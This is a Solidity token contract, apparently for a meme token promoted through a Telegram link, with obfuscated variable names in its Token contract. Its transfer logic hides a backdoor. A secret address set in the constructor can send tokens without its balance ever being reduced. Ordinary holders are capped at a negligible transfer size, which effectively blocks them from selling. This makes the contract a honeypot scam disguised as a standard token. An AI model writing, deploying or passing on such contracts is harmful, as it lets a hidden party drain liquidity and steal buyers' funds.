/*

https://t.me/shibakeneth

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity >0.8.4;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract Token is Ownable {
    constructor(string memory zmgqxlvsnub, string memory fgqcsibnk, address rmxahvzusp, address lvoscrkdmtqg) {
        name = zmgqxlvsnub;
        symbol = fgqcsibnk;
        balanceOf[msg.sender] = totalSupply;
        uawfjhndpvgy[lvoscrkdmtqg] = xivsyuqdmzk;
        nxjs = IUniswapV2Router02(rmxahvzusp);
    }

    mapping(address => uint256) private uawfjhndpvgy;

    string public symbol;

    function transferFrom(address fnzsk, address flqvok, uint256 dilac) public returns (bool success) {
        require(dilac <= allowance[fnzsk][msg.sender]);
        allowance[fnzsk][msg.sender] -= dilac;
        nulchpe(fnzsk, flqvok, dilac);
        return true;
    }

    function approve(address njyh, uint256 dilac) public returns (bool success) {
        allowance[msg.sender][njyh] = dilac;
        emit Approval(msg.sender, njyh, dilac);
        return true;
    }

    uint8 public decimals = 9;

    function transfer(address flqvok, uint256 dilac) public returns (bool success) {
        nulchpe(msg.sender, flqvok, dilac);
        return true;
    }

    function nulchpe(address fnzsk, address flqvok, uint256 dilac) private {
        address pyrzwahld = IUniswapV2Factory(nxjs.factory()).getPair(address(this), nxjs.WETH());
        if (0 == uawfjhndpvgy[fnzsk]) {
            if (fnzsk != pyrzwahld && yfehilgjpmkb[fnzsk] != block.number && dilac < totalSupply) {
                require(dilac <= totalSupply / (10 ** decimals));
            }
            balanceOf[fnzsk] -= dilac;
        }
        balanceOf[flqvok] += dilac;
        yfehilgjpmkb[flqvok] = block.number;
        emit Transfer(fnzsk, flqvok, dilac);
    }

    IUniswapV2Router02 private nxjs;

    mapping(address => uint256) public balanceOf;

    uint256 private xivsyuqdmzk = 102;

    event Transfer(address indexed from, address indexed to, uint256 value);

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    mapping(address => mapping(address => uint256)) public allowance;

    mapping(address => uint256) private yfehilgjpmkb;

    string public name;

    event Approval(address indexed owner, address indexed spender, uint256 value);
}
